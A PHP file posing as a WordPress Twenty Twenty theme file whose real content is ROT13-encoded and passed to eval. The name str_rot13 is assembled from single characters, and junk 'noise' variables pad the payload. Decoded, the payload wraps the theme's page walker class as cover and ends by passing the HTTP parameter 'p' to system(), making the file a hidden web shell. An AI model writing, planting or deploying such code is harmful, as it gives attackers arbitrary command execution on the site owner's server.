<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbz cntr jnyxre sbe guvf gurzr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Gjragl_Gjragl
 * @fvapr Gjragl Gjragl 1.0
 */

vs ( ! pynff_rkvfgf( 'GjraglGjragl_Jnyxre_Cntr' ) ) {
	/**
	 * PHFGBZ CNTR JNYXRE
	 * N phfgbz jnyxre sbe cntrf.
	 *
	 * @fvapr Gjragl Gjragl 1.0
	 */
	pynff GjraglGjragl_Jnyxre_Cntr rkgraqf Jnyxre_Cntr {

		/**
		 * Bhgchgf gur ortvaavat bs gur pheerag ryrzrag va gur gerr.
		 *
		 * @fvapr Gjragl Gjragl 1.0
		 * @fvapr Gjragl Gjragl 1.9 Eranzrq `$cntr` gb `$qngn_bowrpg` naq `$pheerag_cntr` gb `$pheerag_bowrpg_vq`
		 *                          gb zngpu cnerag pynff sbe CUC 8 anzrq cnenzrgre fhccbeg.
		 *
		 * @frr Jnyxre::fgneg_ry()
		 *
		 * @cnenz fgevat  $bhgchg            Hfrq gb nccraq nqqvgvbany pbagrag. Cnffrq ol ersrerapr.
		 * @cnenz JC_Cbfg $qngn_bowrpg       Cntr qngn bowrpg.
		 * @cnenz vag     $qrcgu             Bcgvbany. Qrcgu bs cntr. Hfrq sbe cnqqvat. Qrsnhyg 0.
		 * @cnenz neenl   $netf              Bcgvbany. Neenl bs nethzragf. Qrsnhyg rzcgl neenl.
		 * @cnenz vag     $pheerag_bowrpg_vq Bcgvbany. VQ bs gur pheerag cntr. Qrsnhyg 0.
		 */
		choyvp shapgvba fgneg_ry( &$bhgchg, $qngn_bowrpg, $qrcgu = 0, $netf = neenl(), $pheerag_bowrpg_vq = 0 ) {
			// Erfgberf gur zber qrfpevcgvir, fcrpvsvp anzr sbe hfr jvguva guvf zrgubq.
			$cntr            = $qngn_bowrpg;
			$pheerag_cntr_vq = $pheerag_bowrpg_vq;

			vs ( vffrg( $netf['vgrz_fcnpvat'] ) && 'cerfreir' === $netf['vgrz_fcnpvat'] ) {
				$g = \"\g\";
			} ryfr {
				$g = '';
			}
			vs ( $qrcgu ) {
				$vaqrag = fge_ercrng( $g, $qrcgu );
			} ryfr {
				$vaqrag = '';
			}

			$pff_pynff = neenl( 'cntr_vgrz', 'cntr-vgrz-' . $cntr->VQ );

			vs ( vffrg( $netf['cntrf_jvgu_puvyqera'][ $cntr->VQ ] ) ) {
				$pff_pynff[] = 'cntr_vgrz_unf_puvyqera';
			}

			vs ( ! rzcgl( $pheerag_cntr_vq ) ) {
				$_pheerag_cntr = trg_cbfg( $pheerag_cntr_vq );
				vs ( $_pheerag_cntr && va_neenl( $cntr->VQ, $_pheerag_cntr->naprfgbef, gehr ) ) {
					$pff_pynff[] = 'pheerag_cntr_naprfgbe';
				}
				vs ( $cntr->VQ === $pheerag_cntr_vq ) {
					$pff_pynff[] = 'pheerag_cntr_vgrz';
				} ryfrvs ( $_pheerag_cntr && $cntr->VQ === $_pheerag_cntr->cbfg_cnerag ) {
					$pff_pynff[] = 'pheerag_cntr_cnerag';
				}
			} ryfrvs ( trg_bcgvba( 'cntr_sbe_cbfgf' ) === $cntr->VQ ) {
				$pff_pynff[] = 'pheerag_cntr_cnerag';
			}

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jnyxre-cntr.cuc */
			$pff_pynffrf = vzcybqr( ' ', nccyl_svygref( 'cntr_pff_pynff', $pff_pynff, $cntr, $qrcgu, $netf, $pheerag_cntr_vq ) );
			$pff_pynffrf = $pff_pynffrf ? ' pynff=\"' . rfp_ngge( $pff_pynffrf ) . '\"' : '';

			vs ( '' === $cntr->cbfg_gvgyr ) {
				/* genafyngbef: %q: VQ bs n cbfg. */
				$cntr->cbfg_gvgyr = fcevags( __( '#%q (ab gvgyr)', 'gjraglgjragl' ), $cntr->VQ );
			}

			$netf['yvax_orsber'] = rzcgl( $netf['yvax_orsber'] ) ? '' : $netf['yvax_orsber'];
			$netf['yvax_nsgre']  = rzcgl( $netf['yvax_nsgre'] ) ? '' : $netf['yvax_nsgre'];

			$nggf                 = neenl();
			$nggf['uers']         = trg_creznyvax( $cntr->VQ );
			$nggf['nevn-pheerag'] = ( $cntr->VQ === $pheerag_cntr_vq ) ? 'cntr' : '';

			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jnyxre-cntr.cuc */
			$nggf = nccyl_svygref( 'cntr_zrah_yvax_nggevohgrf', $nggf, $cntr, $qrcgu, $netf, $pheerag_cntr_vq );

			$nggevohgrf = '';
			sbernpu ( $nggf nf $ngge => $inyhr ) {
				vs ( ! rzcgl( $inyhr ) ) {
					$inyhr       = ( 'uers' === $ngge ) ? rfp_hey( $inyhr ) : rfp_ngge( $inyhr );
					$nggevohgrf .= ' ' . $ngge . '=\"' . $inyhr . '\"';
				}
			}

			$netf['yvfg_vgrz_orsber'] = '';
			$netf['yvfg_vgrz_nsgre']  = '';

			// Jenc gur yvax va n qvi naq nccraq n fho zrah gbttyr.
			vs ( vffrg( $netf['fubj_gbttyrf'] ) && gehr === $netf['fubj_gbttyrf'] ) {
				// Jenc gur zrah vgrz yvax pbagragf va n qvi, hfrq sbe cbfvgvbavat.
				$netf['yvfg_vgrz_orsber'] = '<qvi pynff=\"naprfgbe-jenccre\">';
				$netf['yvfg_vgrz_nsgre']  = '';

				// Nqq n gbttyr gb vgrzf jvgu puvyqera.
				vs ( vffrg( $netf['cntrf_jvgu_puvyqera'][ $cntr->VQ ] ) ) {

					$gbttyr_gnetrg_fgevat = '.zrah-zbqny .cntr-vgrz-' . $cntr->VQ . ' > hy';
					$gbttyr_qhengvba      = gjraglgjragl_gbttyr_qhengvba();

					// Nqq gur fho zrah gbttyr.
					$netf['yvfg_vgrz_nsgre'] .= '<ohggba pynff=\"gbttyr fho-zrah-gbttyr svyy-puvyqera-pheerag-pbybe\" qngn-gbttyr-gnetrg=\"' . $gbttyr_gnetrg_fgevat . '\" qngn-gbttyr-glcr=\"fyvqrgbttyr\" qngn-gbttyr-qhengvba=\"' . nofvag( $gbttyr_qhengvba ) . '\" nevn-rkcnaqrq=\"snyfr\"><fcna pynff=\"fperra-ernqre-grkg\">' .
						/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
						__( 'Fubj fho zrah', 'gjraglgjragl' ) .
					'</fcna>' . gjraglgjragl_trg_gurzr_fit( 'purieba-qbja' ) . '</ohggba>';

				}

				// Pybfr gur jenccre.
				$netf['yvfg_vgrz_nsgre'] .= '</qvi><!-- .naprfgbe-jenccre -->';
			}

			// Nqq vpbaf gb zrah vgrzf jvgu puvyqera.
			vs ( vffrg( $netf['fubj_fho_zrah_vpbaf'] ) && gehr === $netf['fubj_fho_zrah_vpbaf'] ) {
				vs ( vffrg( $netf['cntrf_jvgu_puvyqera'][ $cntr->VQ ] ) ) {
					$netf['yvfg_vgrz_nsgre'] = '<fcna pynff=\"vpba\"></fcna>';
				}
			}

			$bhgchg .= $vaqrag . fcevags(
				'<yv%f>%f<n%f>%f%f%f</n>%f',
				$pff_pynffrf,
				$netf['yvfg_vgrz_orsber'],
				$nggevohgrf,
				$netf['yvax_orsber'],
				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
				nccyl_svygref( 'gur_gvgyr', $cntr->cbfg_gvgyr, $cntr->VQ ),
				$netf['yvax_nsgre'],
				$netf['yvfg_vgrz_nsgre']
			);

			vs ( ! rzcgl( $netf['fubj_qngr'] ) ) {
				vs ( 'zbqvsvrq' === $netf['fubj_qngr'] ) {
					$gvzr = $cntr->cbfg_zbqvsvrq;
				} ryfr {
					$gvzr = $cntr->cbfg_qngr;
				}

				$qngr_sbezng = rzcgl( $netf['qngr_sbezng'] ) ? '' : $netf['qngr_sbezng'];
				$bhgchg     .= ' ' . zlfdy2qngr( $qngr_sbezng, $gvzr );
			}
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>